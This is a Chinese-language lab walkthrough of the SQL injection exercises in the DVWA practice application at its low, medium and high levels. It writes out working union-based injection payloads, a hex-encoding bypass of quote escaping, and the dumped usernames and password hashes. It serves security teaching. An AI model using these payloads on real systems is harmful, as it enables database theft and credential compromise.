# DVWA-SQL Injection



## low 


```
http://dvwa.com/vulnerabilities/sqli/?id=1&Submit=Submit#
```

```
SELECT ID, First, Surname FROM table_name WHERE ID = '1';
```


```
1' or 1 --+

//3出現錯誤代表2欄位
1' ORDER BY 3--+

//3出現錯誤代表2欄位
1' GROUP BY 3--+

//3出現錯誤代表2欄位
1' UNION SELECT @,@,@--+
```


Union 注入
```
// |information_schema|,|dvwa|

' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata --+


//|users|,|guestbook|

' UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema='dvwa' --+


//|user_id|,|first_name|,|last_name|,|user|,|password|,|avatar|,|last_login|,|failed_login|

' UniOn Select 1,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name='users' --+



// |admin|202cb962ac59075b964b07152d234b70|,|gordonb|e99a18c428cb38d5f260853678922e03|,|1337|8d3533d75ae2c3966d7e0d4fcc69216b|,|pablo|0d107d09f5bbe40cade3de5c71e9e9b7|,|smithy|5f4dcc3b5aa765d61d8327deb882cf99|

' UniOn Select 1,gRoUp_cOncaT(0x7c,user,0x7C,password,0x7C)+fRoM+users --+

```









## medium 

閉合
```
1+or+1--+
```

這題是數字型，但是用了

`mysqli_real_escape_string` 函式能夠轉義的字符及其對應的轉義形式：

| 字元   | 轉義形式 |
|--------|------------|
| \'     | 單引號     |
| \"     | 雙引號     |
| \\     | 反斜線     |
| \0     | 空字元     |
| \r     | 回車       |
| \n     | 換行       |
| \x1a   | Ctrl-Z     |

這些轉義形式可以確保特殊字符被視為字串的一部分，而不是 SQL 語句中的命令或注入攻擊的一部分。








union注入 關於table_schema='dvwa' 單引號的部份就不用了改用hex 0x64767761
```
//|information_schema|,|dvwa|

1+UniOn+Select+1,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata--+



/|users|,|guestbook|

1+UniOn+Select+1,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=0x64767761--+



//|user_id|,|first_name|,|last_name|,|user|,|password|,|avatar|,|last_login|,|failed_login|

1+UniOn+Select+1,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=0x7573657273--+




//|admin|202cb962ac59075b964b07152d234b70|,|gordonb|e99a18c428cb38d5f260853678922e03|,|1337|8d3533d75ae2c3966d7e0d4fcc69216b|,|pablo|0d107d09f5bbe40cade3de5c71e9e9b7|,|smithy|5f4dcc3b5aa765d61d8327deb882cf99|

1+UniOn+Select+1,gRoUp_cOncaT(0x7c,user,0x7C,password,0x7C)+fRoM+users--+

```

## high

這題最好使用hackbar 來解，並且不要用+號，因為送過去會+號會被encode 


當然也可以抓包修改就建議使用+號，不過返回頁面不在同一頁。



```
1' or 1 #


// |information_schema|,|dvwa|

' UniOn Select 1,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata #



//|users|,|guestbook|

' UniOn Select 1,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema='dvwa' #


//|user_id|,|first_name|,|last_name|,|user|,|password|,|avatar|,|last_login|,|failed_login|

' UniOn Select 1,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name='users' #



// |admin|202cb962ac59075b964b07152d234b70|,|gordonb|e99a18c428cb38d5f260853678922e03|,|1337|8d3533d75ae2c3966d7e0d4fcc69216b|,|pablo|0d107d09f5bbe40cade3de5c71e9e9b7|,|smithy|5f4dcc3b5aa765d61d8327deb882cf99|

' UniOn Select 1,gRoUp_cOncaT(0x7c,user,0x7C,password,0x7C) fRoM users #
```


## impossible

PDO 無法